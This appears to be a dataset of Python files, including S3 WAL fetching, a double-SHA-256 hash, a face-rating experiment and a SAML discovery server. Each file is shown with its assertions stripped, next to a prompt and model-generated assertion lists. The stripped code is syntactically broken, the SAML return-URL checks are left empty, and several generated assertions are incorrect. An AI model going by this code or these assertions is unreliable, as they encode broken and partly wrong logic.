33    bucket = boto.s3.bucket.Bucket(connection=conn, name=bucket_name)
34    return boto.s3.key.Key(bucket=bucket, name=url_tup.path)
35
36
37def uri_put_file(creds, uri, fp, content_encoding=None, conn=None):
38    # Per Boto 2.2.2, which will only read from the current file
39    # position to the end.  This manifests as successfully uploaded
40    # *empty* keys in S3 instead of the intended data because of how
41    # tempfiles are used (create, fill, submit to boto).
42    #
43    # It is presumed it is the caller's responsibility to rewind the
44    # file position, and since the whole program was written with this
45
46    k = _uri_to_key(creds, uri, conn=conn)
47
48    if content_encoding is not None:
49        k.content_type = content_encoding
50
51    k.set_contents_from_file(fp, encrypt_key=True)
52    return k
53
54
55def uri_get_file(creds, uri, conn=None):
56    k = _uri_to_key(creds, uri, conn=conn)
57    return k.get_contents_as_string()
58
59
60def do_lzop_get(creds, url, path, decrypt):
61    """"""
62    Get and decompress a S3 URL
63
64    This streams the content directly to lzop; the compressed version
65    is never stored on disk.
66
67    """"""
68
69    def log_wal_fetch_failures_on_error(exc_tup, exc_processor_cxt):
70        def standard_detail_message(prefix=''):
71            return (prefix + '  There have been {n} attempts to fetch wal '
72                    'file {url} so far.'.format(n=exc_processor_cxt, url=url))
73        typ, value, tb = exc_tup
74        del exc_tup
75
76        # Screen for certain kinds of known-errors to retry from
77        if issubclass(typ, socket.error):
78            socketmsg = value[1] if isinstance(value, tuple) else value
79
80            logger.info(
81                msg='Retrying fetch because of a socket error',
82                detail=standard_detail_message(
83                    ""The socket error's message is '{0}'.""
84                    .format(socketmsg)))
85        elif (issubclass(typ, boto.exception.S3ResponseError) and
86              value.error_code == 'RequestTimeTooSkewed'):
87            logger.info(msg='Retrying fetch because of a Request Skew time',
88                        detail=standard_detail_message())
89        else:
90            # For all otherwise untreated exceptions, report them as a
91            # warning and retry anyway -- all exceptions that can be
92            # justified should be treated and have error messages
93            # listed.
94            logger.warning(
95                msg='retrying WAL file fetch from unexpected exception',
96                detail=standard_detail_message(
97                    'The exception type is {etype} and its value is '
98                    '{evalue} and its traceback is {etraceback}'
99                    .format(etype=typ, evalue=value,
100                            etraceback=''.join(traceback.format_tb(tb)))))
101
102        # Help Python GC by resolving possible cycles
103        del tb
104
105    @retry(retry_with_count(log_wal_fetch_failures_on_error))
106    def download():
107        with open(path, 'wb') as decomp_out:
108            key = _uri_to_key(creds, url)
109            with get_download_pipeline(PIPE, decomp_out, decrypt) as pl:
110                g = gevent.spawn(write_and_return_error, key, pl.stdin)
111
112                try:
113                    # Raise any exceptions from write_and_return_error
114                    exc = g.get()
115                    if exc is not None:
116                        raise exc
117                except boto.exception.S3ResponseError, e:
118                    if e.status == 404:
119                        # Do not retry if the key not present, this
120                        # can happen under normal situations.
121                        pl.abort()
122                        logger.warning(
123                            msg=('could no longer locate object while '
124                                 'performing wal restore'),
125                            detail=('The absolute URI that could not be '
126                                    'located is {url}.'.format(url=url)),
127                            hint=('This can be normal when Postgres is trying '
128                                  'to detect what timelines are available '
129                                  'during restoration.'))
130                        return False
131                    else:
132                        raise
133
134            logger.info(
135                msg='completed download and decompression',
136                detail='Downloaded and decompressed ""{url}"" to ""{path}""'
137                .format(url=url, path=path))
138        return True
139
140    return download()
141
142
143def write_and_return_error(key, stream):
144    try:
145        key.get_contents_to_file(stream)
146        stream.flush()
147    except Exception, e:
148        return e
149    finally:
150        stream.close()
151",7686,"[[27, 'creds', '!=', None, 'Function _uri_to_key requires valid credentials'], 
[27, 'uri', '!=', None, 'Function _uri_to_key requires a URI'],
[38, 'creds', '!=', None, 'Function uri_put_file requires valid credentials'],
[38, 'uri', '!=', None, 'Function uri_put_file requires a URI'],
[38, 'fp', '!=', None, 'Function uri_put_file requires a file pointer'],
[56, 'creds', '!=', None, 'Function uri_get_file requires valid credentials'],
[56, 'uri', '!=', None, 'Function uri_get_file requires a URI'],
[60, 'creds', '!=', None, 'Function do_lzop_get requires valid credentials'],
[60, 'url', '!=', None, 'Function do_lzop_get requires a url'],
[60, 'path', '!=', None, 'Function do_lzop_get requires a path'],
[143, 'key', '!=', None, 'Function write_and_return_error requires a key'],
[143, 'stream', '!=', None, 'Function write_and_return_error requires a stream']]"
Southpaw-TACTIC/Team,"# -*- coding: ascii -*-
#
#  Random/Fortuna/SHAd256.py : SHA_d-256 hash function implementation
#
# Written in 2008 by Dwayne C. Litzenberger <dlitz@dlitz.net>
#
# ===================================================================
# The contents of this file are dedicated to the public domain.  To
# the extent that dedication to the public domain is not available,
# everyone is granted a worldwide, perpetual, royalty-free,
# non-exclusive license to exercise all rights associated with the
# contents of this file for any purpose whatsoever.
# No rights are reserved.
#
# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# ===================================================================

""""""\
SHA_d-256 hash function implementation.

This module should comply with PEP 247.
""""""

__revision__ = ""$Id$""
__all__ = ['new', 'digest_size']

from Crypto.Util.python_compat import *

from binascii import b2a_hex

from Crypto.Hash import SHA256

assert SHA256.digest_size == 32

class _SHAd256(object):
    """"""SHA-256, doubled.

    Returns SHA-256(SHA-256(data)).
    """"""

    digest_size = SHA256.digest_size

    _internal = object()

    def __init__(self, internal_api_check, sha256_hash_obj):
        if internal_api_check is not self._internal:
            raise AssertionError(""Do not instantiate this class directly.  Use %s.new()"" % (__name__,))
        self._h = sha256_hash_obj

    # PEP 247 ""copy"" method
    def copy(self):
        """"""Return a copy of this hashing object""""""
        return _SHAd256(SHAd256._internal, self._h.copy())

    # PEP 247 ""digest"" method
    def digest(self):
        """"""Return the hash value of this object as a binary string""""""
        retval = SHA256.new(self._h.digest()).digest()
        assert len(retval) == 32
        return retval

    # PEP 247 ""hexdigest"" method
    def hexdigest(self):
        """"""Return the hash value of this object as a (lowercase) hexadecimal string""""""
        retval = b2a_hex(self.digest())
        assert len(retval) == 64
        return retval

    # PEP 247 ""update"" method
    def update(self, data):
        self._h.update(data)

# PEP 247 module-level ""digest_size"" variable
digest_size = _SHAd256.digest_size

# PEP 247 module-level ""new"" function
def new(data=""""):
    """"""Return a new SHAd256 hashing object""""""
    return _SHAd256(_SHAd256._internal, SHA256.new(data))

# vim:set ts=4 sw=4 sts=4 expandtab:
","
1# -*- coding: ascii -*-
2#
3#  Random/Fortuna/SHAd256.py : SHA_d-256 hash function implementation
4#
5# Written in 2008 by Dwayne C. Litzenberger <dlitz@dlitz.net>
6#
7# ===================================================================
8# The contents of this file are dedicated to the public domain.  To
9# the extent that dedication to the public domain is not available,
10# everyone is granted a worldwide, perpetual, royalty-free,
11# non-exclusive license to exercise all rights associated with the
12# contents of this file for any purpose whatsoever.
13# No rights are reserved.
14#
15# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,
16# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
17# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
18# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
19# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
20# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
21# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
22# SOFTWARE.
23# ===================================================================
24
25""""""\
26SHA_d-256 hash function implementation.
27
28This module should comply with PEP 247.
29""""""
30
31__revision__ = ""$Id$""
32__all__ = ['new', 'digest_size']
33
34from Crypto.Util.python_compat import *
35
36from binascii import b2a_hex
37
38from Crypto.Hash import SHA256
39
40
41class _SHAd256(object):
42    """"""SHA-256, doubled.
43
44    Returns SHA-256(SHA-256(data)).
45    """"""
46
47    digest_size = SHA256.digest_size
48
49    _internal = object()
50
51    def __init__(self, internal_api_check, sha256_hash_obj):
52        if internal_api_check is not self._internal:
53            raise AssertionError(""Do not instantiate this class directly.  Use %s.new()"" % (__name__,))
54        self._h = sha256_hash_obj
55
56    # PEP 247 ""copy"" method
57    def copy(self):
58        """"""Return a copy of this hashing object""""""
59        return _SHAd256(SHAd256._internal, self._h.copy())
60
61    # PEP 247 ""digest"" method
62    def digest(self):
63        """"""Return the hash value of this object as a binary string""""""
64        retval = SHA256.new(self._h.digest()).digest()
65        return retval
66
67    # PEP 247 ""hexdigest"" method
68    def hexdigest(self):
69        """"""Return the hash value of this object as a (lowercase) hexadecimal string""""""
70        retval = b2a_hex(self.digest())
71        return retval
72
73    # PEP 247 ""update"" method
74    def update(self, data):
75        self._h.update(data)
76
77# PEP 247 module-level ""digest_size"" variable
78digest_size = _SHAd256.digest_size
79
80# PEP 247 module-level ""new"" function
81def new(data=""""):
82    """"""Return a new SHAd256 hashing object""""""
83    return _SHAd256(_SHAd256._internal, SHA256.new(data))
84
85# vim:set ts=4 sw=4 sts=4 expandtab:
86","[['SHA256.digest_size', '==', '32'], ['len(retval)', '==', '32'], ['len(retval)', '==', '64']]",3,3,1.0,0.0010642071656615,"['__revision__', '__all__', 'digest_size', '_internal', 'internal_api_check', 'sha256_hash_obj', 'self._h', 'retval', 'data']",9,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__revision__', '__all__', 'digest_size', '_internal', 'internal_api_check', 'sha256_hash_obj', 'self._h', 'retval', 'data']
*Code:

1# -*- coding: ascii -*-
2#
3#  Random/Fortuna/SHAd256.py : SHA_d-256 hash function implementation
4#
5# Written in 2008 by Dwayne C. Litzenberger <dlitz@dlitz.net>
6#
7# ===================================================================
8# The contents of this file are dedicated to the public domain.  To
9# the extent that dedication to the public domain is not available,
10# everyone is granted a worldwide, perpetual, royalty-free,
11# non-exclusive license to exercise all rights associated with the
12# contents of this file for any purpose whatsoever.
13# No rights are reserved.
14#
15# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,
16# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
17# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
18# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
19# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
20# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
21# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
22# SOFTWARE.
23# ===================================================================
24
25""""""\
26SHA_d-256 hash function implementation.
27
28This module should comply with PEP 247.
29""""""
30
31__revision__ = ""$Id$""
32__all__ = ['new', 'digest_size']
33
34from Crypto.Util.python_compat import *
35
36from binascii import b2a_hex
37
38from Crypto.Hash import SHA256
39
40
41class _SHAd256(object):
42    """"""SHA-256, doubled.
43
44    Returns SHA-256(SHA-256(data)).
45    """"""
46
47    digest_size = SHA256.digest_size
48
49    _internal = object()
50
51    def __init__(self, internal_api_check, sha256_hash_obj):
52        if internal_api_check is not self._internal:
53            raise AssertionError(""Do not instantiate this class directly.  Use %s.new()"" % (__name__,))
54        self._h = sha256_hash_obj
55
56    # PEP 247 ""copy"" method
57    def copy(self):
58        """"""Return a copy of this hashing object""""""
59        return _SHAd256(SHAd256._internal, self._h.copy())
60
61    # PEP 247 ""digest"" method
62    def digest(self):
63        """"""Return the hash value of this object as a binary string""""""
64        retval = SHA256.new(self._h.digest()).digest()
65        return retval
66
67    # PEP 247 ""hexdigest"" method
68    def hexdigest(self):
69        """"""Return the hash value of this object as a (lowercase) hexadecimal string""""""
70        retval = b2a_hex(self.digest())
71        return retval
72
73    # PEP 247 ""update"" method
74    def update(self, data):
75        self._h.update(data)
76
77# PEP 247 module-level ""digest_size"" variable
78digest_size = _SHAd256.digest_size
79
80# PEP 247 module-level ""new"" function
81def new(data=""""):
82    """"""Return a new SHAd256 hashing object""""""
83    return _SHAd256(_SHAd256._internal, SHA256.new(data))
84
85# vim:set ts=4 sw=4 sts=4 expandtab:
86",4390,"[[51, 'internal_api_check', '==', '_internal', 'this checks if the API call is internal'],
[74, 'data', '!=', None, 'data fed to update function cannot be None'],
[81, 'data', '!=', None, 'data variable for new function cannot be None']]"
suchow/judicious,"from copy import deepcopy
from random import shuffle, sample, random

import judicious

judicious.seed(""e1f06de6-f6a7-894f-e9e6-bf337e421ace"")


def trial_sequences(n_stimuli, n_ratings,
                    n_trials, n_retests, shuffle_sequences=False):

    # crucial tests
    assert n_stimuli % n_trials == 0
    assert n_retests <= n_trials

    # unique stimulus IDs
    stimuli = list(range(1, n_stimuli+1))

    # create lists of lists of trials
    sequences = []
    for _ in range(n_ratings):

        # for each rating batch, shuffle stimuli
        shuffle(stimuli)
        stimuli_perm = deepcopy(stimuli)

        # partition the stimuli into n_trial chunks
        for i in range(0, n_stimuli, n_trials):
            sequence = stimuli_perm[i:i + n_trials]
            retests = sample(sequence, n_retests)
            shuffle(retests)
            sequences += [sequence + retests]

    if shuffle_sequences:
        shuffle(sequences)

    return sequences


def judge_faces(faces, attribute):
    """"""Run through an experiment on judging faces.""""""
    person = judicious.Person()
    # r_consent = person.consent()
    r_attrition = person.attrition()
    r_instruct = person.instruct_judge_faces()
    results = []
    for face in faces:
        r = person.judge_face(face, attribute)
        results.append(r)
    r_debrief = person.debrief()
    return results


r = judge_faces([1, 2, 3, 4], 'trustworthy')
print(r)
","
1from copy import deepcopy
2from random import shuffle, sample, random
3
4import judicious
5
6judicious.seed(""e1f06de6-f6a7-894f-e9e6-bf337e421ace"")
7
8
9def trial_sequences(n_stimuli, n_ratings,
10                    n_trials, n_retests, shuffle_sequences=False):
11
12    # crucial tests
13
14    # unique stimulus IDs
15    stimuli = list(range(1, n_stimuli+1))
16
17    # create lists of lists of trials
18    sequences = []
19    for _ in range(n_ratings):
20
21        # for each rating batch, shuffle stimuli
22        shuffle(stimuli)
23        stimuli_perm = deepcopy(stimuli)
24
25        # partition the stimuli into n_trial chunks
26        for i in range(0, n_stimuli, n_trials):
27            sequence = stimuli_perm[i:i + n_trials]
28            retests = sample(sequence, n_retests)
29            shuffle(retests)
30            sequences += [sequence + retests]
31
32    if shuffle_sequences:
33        shuffle(sequences)
34
35    return sequences
36
37
38def judge_faces(faces, attribute):
39    """"""Run through an experiment on judging faces.""""""
40    person = judicious.Person()
41    # r_consent = person.consent()
42    r_attrition = person.attrition()
43    r_instruct = person.instruct_judge_faces()
44    results = []
45    for face in faces:
46        r = person.judge_face(face, attribute)
47        results.append(r)
48    r_debrief = person.debrief()
49    return results
50
51
52r = judge_faces([1, 2, 3, 4], 'trustworthy')
53print(r)
54","[['n_stimuli % n_trials', '==', '0'], ['n_retests', '<=', 'n_trials']]",2,2,1.0,0.0013927576601671,"['n_stimuli', 'n_ratings', 'stimuli', 'sequences', 'stimuli_perm', 'sequence', 'retests', 'faces', 'attribute', 'person', '# r_consent', 'r_attrition', 'r_instruct', 'results', 'r', 'r_debrief']",16,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['n_stimuli', 'n_ratings', 'stimuli', 'sequences', 'stimuli_perm', 'sequence', 'retests', 'faces', 'attribute', 'person', '# r_consent', 'r_attrition', 'r_instruct', 'results', 'r', 'r_debrief']
*Code:

1from copy import deepcopy
2from random import shuffle, sample, random
3
4import judicious
5
6judicious.seed(""e1f06de6-f6a7-894f-e9e6-bf337e421ace"")
7
8
9def trial_sequences(n_stimuli, n_ratings,
10                    n_trials, n_retests, shuffle_sequences=False):
11
12    # crucial tests
13
14    # unique stimulus IDs
15    stimuli = list(range(1, n_stimuli+1))
16
17    # create lists of lists of trials
18    sequences = []
19    for _ in range(n_ratings):
20
21        # for each rating batch, shuffle stimuli
22        shuffle(stimuli)
23        stimuli_perm = deepcopy(stimuli)
24
25        # partition the stimuli into n_trial chunks
26        for i in range(0, n_stimuli, n_trials):
27            sequence = stimuli_perm[i:i + n_trials]
28            retests = sample(sequence, n_retests)
29            shuffle(retests)
30            sequences += [sequence + retests]
31
32    if shuffle_sequences:
33        shuffle(sequences)
34
35    return sequences
36
37
38def judge_faces(faces, attribute):
39    """"""Run through an experiment on judging faces.""""""
40    person = judicious.Person()
41    # r_consent = person.consent()
42    r_attrition = person.attrition()
43    r_instruct = person.instruct_judge_faces()
44    results = []
45    for face in faces:
46        r = person.judge_face(face, attribute)
47        results.append(r)
48    r_debrief = person.debrief()
49    return results
50
51
52r = judge_faces([1, 2, 3, 4], 'trustworthy')
53print(r)
54",3040,"[[9, 'n_stimuli', '>=', 1, ""We need at least one stimulus for the sequence.""],
[9, 'n_ratings', '>=', 1, ""We need at least one rating for the sequence.""],
[16, 'n_stimuli', '==', 'len(stimuli)', ""Number of stimuli has to be equal to the length of the stimuli list.""],
[25, 'n_trials', '<=', 'n_stimuli', ""The number of trials can't exceed the total number of stimuli.""],
[27, 'n_retests', '<=', 'len(sequence)', ""The number of retests can't exceed the total number of items in the sequence.""],
[38, 'faces', '!=', '', ""Faces variable cannot be empty for face judgement.""],
[38, 'attribute', '!=', '', ""Attribute cannot be empty for face judgement.""],
[44, 'faces', '==', 'len(results)', ""Number of results should match the number of faces judged.""],
[52, 'r', '!=', '', ""Result of face judgement can't be empty.""]]"
cloudera/hue,"from six.moves.urllib import parse

from saml2.entity import Entity
from saml2.response import VerificationError

__author__ = 'rolandh'

IDPDISC_POLICY = ""urn:oasis:names:tc:SAML:profiles:SSO:idp-discovery-protocol:single""


class DiscoveryServer(Entity):
    def __init__(self, config=None, config_file=""""):
        if config or config_file:
            Entity.__init__(self, ""disco"", config, config_file)

    def parse_discovery_service_request(self, url="""", query=""""):
        if url:
            part = parse.urlparse(url)
            dsr = parse.parse_qs(part[4])
        elif query:
            dsr = parse.parse_qs(query)
        else:
            dsr = {}

        # verify

        for key in [""isPassive"", ""return"", ""returnIDParam"", ""policy"",
                    'entityID']:
            try:
                assert len(dsr[key]) == 1
                dsr[key] = dsr[key][0]
            except KeyError:
                pass

        if ""return"" in dsr:
            part = parse.urlparse(dsr[""return""])
            if part.query:
                qp = parse.parse_qs(part.query)
                if ""returnIDParam"" in dsr:
                    assert dsr[""returnIDParam""] not in qp.keys()
                else:
                    assert ""entityID"" not in qp.keys()
        else:
            # If metadata not used this is mandatory
            raise VerificationError(""Missing mandatory parameter 'return'"")

        if ""policy"" not in dsr:
            dsr[""policy""] = IDPDISC_POLICY

        try:
            assert dsr[""isPassive""] in [""true"", ""false""]
        except KeyError:
            pass

        if ""isPassive"" in dsr and dsr[""isPassive""] == ""true"":
            dsr[""isPassive""] = True
        else:
            dsr[""isPassive""] = False

        if not ""returnIDParam"" in dsr:
            dsr[""returnIDParam""] = ""entityID""

        return dsr

    # -------------------------------------------------------------------------

    @staticmethod
    def create_discovery_service_response(return_url=None,
                                          returnIDParam=""entityID"",
                                          entity_id=None, **kwargs):
        if return_url is None:
            return_url = kwargs[""return""]

        if entity_id:
            qp = parse.urlencode({returnIDParam: entity_id})

            part = parse.urlparse(return_url)
            if part.query:
                # Iff there is a query part add the new info at the end
                return_url = ""%s&%s"" % (return_url, qp)
            else:
                return_url = ""%s?%s"" % (return_url, qp)

        return return_url

    def verify_sp_in_metadata(self, entity_id):
        if self.metadata:
            endp = self.metadata.discovery_response(entity_id)
            if endp:
                return True

        return False

    def verify_return(self, entity_id, return_url):
        for endp in self.metadata.discovery_response(entity_id):
            try:
                assert return_url.startswith(endp[""location""])
            except AssertionError:
                pass
            else:
                return True
        return False
","
1from six.moves.urllib import parse
2
3from saml2.entity import Entity
4from saml2.response import VerificationError
5
6__author__ = 'rolandh'
7
8IDPDISC_POLICY = ""urn:oasis:names:tc:SAML:profiles:SSO:idp-discovery-protocol:single""
9
10
11class DiscoveryServer(Entity):
12    def __init__(self, config=None, config_file=""""):
13        if config or config_file:
14            Entity.__init__(self, ""disco"", config, config_file)
15
16    def parse_discovery_service_request(self, url="""", query=""""):
17        if url:
18            part = parse.urlparse(url)
19            dsr = parse.parse_qs(part[4])
20        elif query:
21            dsr = parse.parse_qs(query)
22        else:
23            dsr = {}
24
25        # verify
26
27        for key in [""isPassive"", ""return"", ""returnIDParam"", ""policy"",
28                    'entityID']:
29            try:
30                dsr[key] = dsr[key][0]
31            except KeyError:
32                pass
33
34        if ""return"" in dsr:
35            part = parse.urlparse(dsr[""return""])
36            if part.query:
37                qp = parse.parse_qs(part.query)
38                if ""returnIDParam"" in dsr:
39                else:
40        else:
41            # If metadata not used this is mandatory
42            raise VerificationError(""Missing mandatory parameter 'return'"")
43
44        if ""policy"" not in dsr:
45            dsr[""policy""] = IDPDISC_POLICY
46
47        try:
48        except KeyError:
49            pass
50
51        if ""isPassive"" in dsr and dsr[""isPassive""] == ""true"":
52            dsr[""isPassive""] = True
53        else:
54            dsr[""isPassive""] = False
55
56        if not ""returnIDParam"" in dsr:
57            dsr[""returnIDParam""] = ""entityID""
58
59        return dsr
60
61    # -------------------------------------------------------------------------
62
63    @staticmethod
64    def create_discovery_service_response(return_url=None,
65                                          returnIDParam=""entityID"",
66                                          entity_id=None, **kwargs):
67        if return_url is None:
68            return_url = kwargs[""return""]
69
70        if entity_id:
71            qp = parse.urlencode({returnIDParam: entity_id})
72
73            part = parse.urlparse(return_url)
74            if part.query:
75                # Iff there is a query part add the new info at the end
76                return_url = ""%s&%s"" % (return_url, qp)
77            else:
78                return_url = ""%s?%s"" % (return_url, qp)
79
80        return return_url
81
82    def verify_sp_in_metadata(self, entity_id):
83        if self.metadata:
84            endp = self.metadata.discovery_response(entity_id)
85            if endp:
86                return True
87
88        return False
89
90    def verify_return(self, entity_id, return_url):
91        for endp in self.metadata.discovery_response(entity_id):
92            try:
93            except AssertionError:
94                pass
95            else:
96                return True
97        return False
98","[['len(dsr[key])', '==', '1'], ['return_url.startswith(endp[""location""])', '==', 'True']]",5,2,0.4,0.0006353240152477,"['__author__', 'IDPDISC_POLICY', 'config', 'config_file', 'url', 'query', 'part', 'dsr', 'dsr[key]', 'qp', 'dsr[""policy""]', 'dsr[""isPassive""]', 'dsr[""returnIDParam""]', 'return_url', 'entity_id', 'endp']",16,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__author__', 'IDPDISC_POLICY', 'config', 'config_file', 'url', 'query', 'part', 'dsr', 'dsr[key]', 'qp', 'dsr[""policy""]', 'dsr[""isPassive""]', 'dsr[""returnIDParam""]', 'return_url', 'entity_id', 'endp']
*Code:

1from six.moves.urllib import parse
2
3from saml2.entity import Entity
4from saml2.response import VerificationError
5
6__author__ = 'rolandh'
7
8IDPDISC_POLICY = ""urn:oasis:names:tc:SAML:profiles:SSO:idp-discovery-protocol:single""
9
10
11class DiscoveryServer(Entity):
12    def __init__(self, config=None, config_file=""""):
13        if config or config_file:
14            Entity.__init__(self, ""disco"", config, config_file)
15
16    def parse_discovery_service_request(self, url="""", query=""""):
17        if url:
18            part = parse.urlparse(url)
19            dsr = parse.parse_qs(part[4])
20        elif query:
21            dsr = parse.parse_qs(query)
22        else:
23            dsr = {}
24
25        # verify
26
27        for key in [""isPassive"", ""return"", ""returnIDParam"", ""policy"",
28                    'entityID']:
29            try:
30                dsr[key] = dsr[key][0]
31            except KeyError:
32                pass
33
34        if ""return"" in dsr:
35            part = parse.urlparse(dsr[""return""])
36            if part.query:
37                qp = parse.parse_qs(part.query)
38                if ""returnIDParam"" in dsr:
39                else:
40        else:
41            # If metadata not used this is mandatory
42            raise VerificationError(""Missing mandatory parameter 'return'"")
43
44        if ""policy"" not in dsr:
45            dsr[""policy""] = IDPDISC_POLICY
46
47        try:
48        except KeyError:
49            pass
50
51        if ""isPassive"" in dsr and dsr[""isPassive""] == ""true"":
52            dsr[""isPassive""] = True
53        else:
54            dsr[""isPassive""] = False
55
56        if not ""returnIDParam"" in dsr:
57            dsr[""returnIDParam""] = ""entityID""
58
59        return dsr
60
61    # -------------------------------------------------------------------------
62
63    @staticmethod
64    def create_discovery_service_response(return_url=None,
65                                          returnIDParam=""entityID"",
66                                          entity_id=None, **kwargs):
67        if return_url is None:
68            return_url = kwargs[""return""]
69
70        if entity_id:
71            qp = parse.urlencode({returnIDParam: entity_id})
72
73            part = parse.urlparse(return_url)
74            if part.query:
75                # Iff there is a query part add the new info at the end
76                return_url = ""%s&%s"" % (return_url, qp)
77            else:
78                return_url = ""%s?%s"" % (return_url, qp)
79
80        return return_url
81
82    def verify_sp_in_metadata(self, entity_id):
83        if self.metadata:
84            endp = self.metadata.discovery_response(entity_id)
85            if endp:
86                return True
87
88        return False
89
90    def verify_return(self, entity_id, return_url):
91        for endp in self.metadata.discovery_response(entity_id):
92            try:
93            except AssertionError:
94                pass
95            else:
96                return True
97        return False
98",4636,"[[12, 'config', '!=', None, ""Config object is needed to initialize 'disco' in the underlying Entity class""],
 [12, 'config_file', '!=', """", ""Config file location is needed to initialize 'disco' in the underlying Entity class""],
 [16, 'url', '!=', """", ""Either 'url' or 'query' parameter is needed to parse discovery service request""],
 [16, 'query', '!=', """", ""Either 'url' or 'query' parameter is needed to parse discovery service request""],
 [34, 'dsr[""return""]', '!=', None, ""'return' parameter is mandatory when not using metadata""],
 [44, 'dsr[""policy""]', '==', None, ""If not provided, 'policy' parameter is set to IDPDISC_POLICY by default""],
 [64, 'return_url', '!=', None, ""'return_url' should not be None when creating discovery response""],
 [66, 'returnIDParam', '!=', """", ""'returnIDParam' should not be an empty string""],
 [66, 'entity_id', '!=', None, ""'entity_id' is needed to create discovery service response""],
 [82, 'entity_id', '!=', None, ""'entity_id' is needed to verify SP in metadata""],
 [90, 'entity_id', '!=', None, ""'entity_id' is needed to verify return""],
 [90, 'return_url', '!=', None, ""'return_url' is needed to verify return""]]"
turekj/iDK,"import core.task
import os
import pytest
import tasks.remove_dir_task

class TestRemoveDirectoryTask(object):
	task = tasks.remove_dir_task.RemoveDirectoryTask()

	def test_execute_raises_on_no_path_given(self):
		with pytest.raises(core.task.TaskParameterException):
			self.task.execute_task()

	def test_execute_raises_on_directory_not_exists(self):
		with pytest.raises(core.task.TaskGenericException):
			self.task.execute_task({'path': 'test/non_existing_directory'})

	def test_execute_removes_directory(self):
		os.mkdir('test/non_existing_directory')

		self.task.execute_task({'path': 'test/non_existing_directory'})
		exists = os.path.exists('test/non_existing_directory')

		if os.path.exists('test/non_existing_directory'):
			os.rmdir('test/non_existing_directory')

		assert exists is False
","
1import core.task
2import os
3import pytest
4import tasks.remove_dir_task
5
6class TestRemoveDirectoryTask(object):
